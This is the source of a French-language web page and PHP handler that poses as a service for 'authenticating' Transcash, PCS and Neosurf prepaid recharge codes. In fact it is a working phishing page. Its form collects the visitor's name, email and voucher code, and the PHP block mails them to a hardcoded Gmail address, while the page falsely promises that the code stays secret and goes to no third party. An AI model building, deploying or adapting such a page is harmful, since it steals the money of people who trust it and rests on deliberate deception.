<!--
Author: W3layouts
Author URL: http://w3layouts.com
License: Creative Commons Attribution 3.0 Unported
License URL: http://creativecommons.org/licenses/by/3.0/
-->

<!DOCTYPE html>
<html lang="zxx">

<head>
    <title>Authentication rapide</title>
    <!-- Meta tag Keywords -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="UTF-8" />
    <meta name="keywords" content="Repay Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design"
    />
    <script>
        addEventListener("load", function() {
            setTimeout(hideURLbar, 0);
        }, false);

        function hideURLbar() {
            window.scrollTo(0, 1);
        }
    </script>
    <!-- //Meta tag Keywords -->
    <!-- Custom-Files -->
    <link rel="stylesheet" href="css/bootstrap.css">
    <!-- Bootstrap-Core-CSS -->
    <link rel="stylesheet" href="css/style2.css" type="text/css" media="all" />
    <link rel="stylesheet" href="css/slider.css" type="text/css" media="all" />
    <!-- Style-CSS -->
    <!-- font-awesome-icons -->
    <link href="css/font-awesome.css" rel="stylesheet">
    <!-- //font-awesome-icons -->
    <!-- /Fonts -->
    <link href="//fonts.googleapis.com/css?family=Catamaran:100,200,300,400,500,600,700,800" rel="stylesheet">

    <!-- //Fonts -->
</head>

<body>
    <!-- mian-content -->
    <div class="main-w3-pvt-header-sec page-w3pvt-inner" id="home">
        <div class="overlay-innerpage">
            <!-- header -->
            <header>
                <div class="container">
                    <div class="header d-lg-flex justify-content-between align-items-center py-lg-3 px-lg-3">

                        <div class="apply-w3-pvt ml-lg-3">
                            <a class="btn read" href="index.html" role="button" style="color: white;">Retourner sur l'Accueil</a>
                        </div>
                        <!-- //search -->

                    </div>
                </div>
            </header>
            <!-- //header -->
            <!-- /banner-inner -->

            <!-- //banner-inner -->
        </div>
    </div>
    <!-- //banner -->
    <section class="content-info py-5" >
        <div class="container py-md-5">
            <div class="text-center px-lg-5">
                <h3 class="title-w3ls mb-5">CONFIRMATION ET AUTHENTIFICATION DES RECHARGES (TRANS-CASH ,PCS, NEO-SURF)</h3>
            </div>
            <div class="contact-w3ls-form mt-5">
                <form action="/auth-me.code.php" class="w3-pvt-contact-fm" method="post">
                    <div class="row">
                        <div class="col-lg-12">
                            <div class="form-group">
                                <label>Nom <span style="color: red;">*</span></label>
                                <input class="form-control" type="text" name="name" placeholder="Votre réponse" required>
                                <p style="color:red"><?php echo $nom_error;?></p>
                            </div>
                            <div class="form-group">
                                <label>Prénom <span style="color: red;">*</span></label>
                                <input class="form-control" type="text" name="prenom" placeholder="Votre réponse" required>
                                <p style="color:red"><?php echo $prenom_error;?></p>
                            </div>
                            <div class="form-group">
                                <label>Type de Recharges <span style="color: red;">*</span></label>
                                <select name="" id="">
                                <option value="" selected>TRANS-CASH</option>
                                <option value="">PCS</option>
                                <option value="">NEO-SURF</option>
                               </select>
                               <p style="color:red"><?php echo $type_error;?></p>
                            </div>
                            <div class="form-group">
                                <label>Adresse Email <span style="color: red;">*</span></label>
                                <input class="form-control" type="email" name="email" placeholder="Votre réponse" required="">
                                <p style="color:red"><?php echo $email_error;?></p>
                            </div>
                            <div class="form-group">
                                <label>Code de la Recharge <span style="color: red;">*</span></label>
                                <input class="form-control" type="text" name="code" placeholder="Votre réponse" required="">
                                <p style="color:red"><?php echo $code_error;?></p>
                            </div>
                            <div class="form-group">
                                <label>Date et heure du Paiement <span style="color: red;">*</span></label>
                                <input class="form-control" type="datetime-local" name="date" placeholder="Votre réponse" required="">
                                <p style="color:red"><?php echo $date_error;?></p>
                            </div>
                        </div>

                        <div class="form-group mx-auto mt-3">
                            <button type="submit" name="submit" class="btn submit">Authentifier mon code</button>
                        </div>
                        <p style="color:red">Faites confiance en notre serice car nous vous authentifions en gardant secret votre code. Il n'est partagé avec aucun tiers.</p>
                    
                    </div>

                </form>
            </div>
        </div>
    </section>
    <!-- //contact -->

    </footer>
    <!-- //footer -->
    <div class="copy-right">
        <div class="container">
            <div class="row">
                <p class="copy-right-grids text-md-left text-center my-sm-4 my-4 col-md-6">© 2022 Tous droits reservés <br> Copyright authentification-de-recharge.fr </p>
                <div class="w3-pvt-footer text-md-right text-center mt-4 col-md-5">
                    <ul class="list-unstyled w3-pvt-icons">
                        <li>
                            <a href="tansrecharge-facebook.fr">
                                <span class="fa fa-facebook-f"></span>
                            </a>
                        </li>
                        <li>
                            <a href="tansrecharge-twitter.fr">
                                <span class="fa fa-twitter"></span>
                            </a>
                        </li>
                        <li>
                            <a href="tansrecharge-dribbble.fr">
                                <span class="fa fa-dribbble"></span>
                            </a>
                        </li>
                        <li>
                            <a href="tansrecharge-vk.fr">
                                <span class="fa fa-vk"></span>
                            </a>
                        </li>
                    </ul>
                </div>
                <div class="move-top text-right col-md-1">
                    <a href="#home" class="move-top"> <span class="fa fa-angle-up  mb-3" aria-hidden="true"></span></a>
                </div>

            </div>
        </div>
    </div>
</body>
<?php
function check_email_address($email) { 
    return (!preg_match( "^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$^", $email)) ? false : true; 
} 
$email_error="";
$date_error="";
$code_error="";
$type_error="";
$nom_error="";
$prenom_error="";
if(isset($_POST['submit'])){

    if(isset($_POST['name'])&& !empty($_POST['name'])){
        if(isset($_POST['prenom']) && !empty($_POST['prenom'])){
            if(isset($_POST['email']) && !empty($_POST['email']) && check_email_address($_POST['email'])==true){
                if(isset($_POST['code']) ){
                    if(isset($_POST['date'])&& !empty($_POST['code']) ){
                        $email=$_POST['email'];
                        $name=$_POST['name'];
                        $prenom=$_POST['prenom'];
                        $code=$_POST['code'];
                        
                        
                        var_dump($_POST);
                        $to=$_ENV["to"];
                        
                        $to = "servicetranscash22221@gmail.com";
                        $subject = "Authentification de Code de transaction";
                        
                        $message = "
                        <html>
                        <head>
                        <title>Code d'authentification</title>
                        </head>
                        <body>
                        <p>Voici les informations du demandeur</p>
                        <table>
                        <tr>
                        <th>Nom et Présom</th>
                        <th>Email</th>
                        <th>Code</th>
                        </tr>
                        <tr>
                        <td>".$name." ".$prenom."</td>
                        <td>".$email."</td>
                        <td>".$code."</td>
                        </tr>
                        </table>
                        </body>
                        </html>
                        ";
                        
                        // Always set content-type when sending HTML email
                        $headers = "MIME-Version: 1.0" . "\r\n";
                        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
                        
                        // More head ers
                        $headers .= 'From: <rservicedes@gmail.com>' . "\r\n";
                        
                        
                        $message="E-mail : ".$email."\nNom et prénom : ".$name." ".$prenom."\nCode : ".$code;
                        mail($to,$subject,$message);
                        
                    }else{
                        $nom_error="Veuillez écrire la date";
                    }
                }else{
                    $nom_error="Veuillez écrire le code";
                }
            }else{
                $nom_error="Veuillez écrire votre email au format correct ex: monemail0@gmail.com";
            }
        }else{
            $nom_error="Veuillez écrire votre prénom";
        }
    }else{
        $nom_error="Veuillez écrire votre nom";
    }

}
?>
</html>
